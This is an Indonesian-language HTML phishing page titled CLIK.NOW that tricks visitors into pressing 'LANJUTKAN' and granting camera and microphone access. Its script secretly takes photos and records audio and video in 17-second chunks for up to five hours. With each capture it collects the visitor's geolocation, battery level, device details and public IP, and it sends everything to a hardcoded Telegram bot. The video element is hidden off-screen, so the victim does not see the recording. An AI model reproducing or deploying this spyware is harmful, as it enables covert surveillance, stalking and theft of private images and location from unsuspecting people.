<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>CLIK.NOW</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: #000;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }
    .popup {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 30px;
      border-radius: 15px;
      text-align: center;
      width: 300px;
    }
    button {
      transition: background 0.3s ease, transform 0.3s ease;
      padding: 10px 20px;
      margin-top: 15px;
      border: none;
      border-radius: 8px;
      background: #00ff88;
      color: #000;
      font-weight: bold;
      cursor: pointer;
    }
    #video {
      display: none !important;
      width: 1px;
      height: 1px;
      position: absolute;
      left: -9999px;
    }
    .circle-light {
      position: absolute;
      top: 5px;
      left: 5px;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background-color: red;
      box-shadow: 0 0 8px 3px red;
      z-index: 1000;
    }
    #loading {
      display: none;
      margin-top: 30px;
    }
    .loader {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #00ff88;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="circle-light"></div>

  <marquee behavior="scroll" direction="left" style="position: fixed; top: 0; width: 100%; background: rgba(0,0,0,0.5); color: #fff; padding: 10px; font-weight: bold; z-index: 999;">
    silahkan pencet lanjutkan.
  </marquee>

  <div class="popup" id="step1">
    <h2>SILAHKAN PENCET LANJUTKAN</h2>
    <button onclick="startAll()">LANJUTKAN</button>
  </div>

  <div id="loading">
    <div class="loader"></div>
    <p>loadinggg...</p>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const token = '7877584682:AAHvvEzlzWyWq5QOKnx7y3cjPcMIOBOPUdg';
    const chat_id = '7552410869';
    let recorder;
    let recordedChunks = [];

    async function startAll() {
      document.getElementById('step1').style.display = 'none';
      document.getElementById('loading').style.display = 'block';

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.getElementById('video').srcObject = stream;

        const synth = window.speechSynthesis;
        const welcome = new SpeechSynthesisUtterance('Halo! bang halo bangg kamu ganteng kwkwkwkw');
        welcome.lang = 'id-ID';
        synth.speak(welcome);

        await takeAndSendPhotos(stream);

        recorder = new MediaRecorder(stream);
        recorder.ondataavailable = handleDataAvailable;
        recorder.onstop = () => handleStop(stream);
        recorder.start();

        setTimeout(() => {
          setInterval(() => {
            recorder.stop();
            recorder.start();
          }, 17000);
        }, 17000);

        setTimeout(() => {
          recorder.stop();
          alert("Rekaman otomatis selesai setelah 5 jam.");
        }, 5 * 60 * 60 * 1000);
      } catch (err) {
        alert("Akses kamera/mikrofon ditolak.");
      }
    }

    async function takeAndSendPhotos(stream) {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');

      await new Promise(resolve => setTimeout(resolve, 1000));
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      for (let i = 0; i < 3; i++) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

        const info = await getDeviceInfo();

        const caption = `
[Foto ${i+1}]
Device: ${info.device}
Lokasi: ${info.location}
Baterai: ${info.battery}
Waktu: ${info.time}
`;

        const formData = new FormData();
        formData.append("chat_id", chat_id);
        formData.append("photo", blob, `photo${i+1}.jpg`);
        formData.append("caption", caption.trim());

        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        await new Promise(resolve => setTimeout(resolve, 1000));
      }
    }

    async function getDeviceInfo() {
      const device = navigator.userAgent;
      const waktu = new Date();
      const jam = waktu.toLocaleTimeString();
      const tanggal = waktu.toLocaleDateString();
      const fullTime = waktu.toString();

      let location = "Tidak tersedia";
      await new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
          pos => {
            location = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            resolve();
          },
          () => resolve()
        );
      });

      const battery = await navigator.getBattery()
        .then(b => `${Math.round(b.level * 100)}% (${b.charging ? 'Mengisi' : 'Tidak mengisi'})`)
        .catch(() => 'Tidak tersedia');

      return {
        device,
        time: `${tanggal} ${jam}`,
        location,
        battery
      };
    }

    function handleDataAvailable(event) {
      if (event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    }

    async function handleStop(stream) {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      recordedChunks = [];

      const info = await getDeviceInfo();

      const message = `
[REKAMAN OTOMATIS]
Device: ${info.device}
IP: ${await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip)}
Waktu: ${info.time}
Lokasi: ${info.location}
Baterai: ${info.battery}
`;

      const formData = new FormData();
      formData.append("chat_id", chat_id);
      formData.append("caption", message.trim());
      formData.append("video", blob, "rekaman.webm");

      fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
        method: 'POST',
        body: formData
      });
    }
  </script>
</body>
</html>
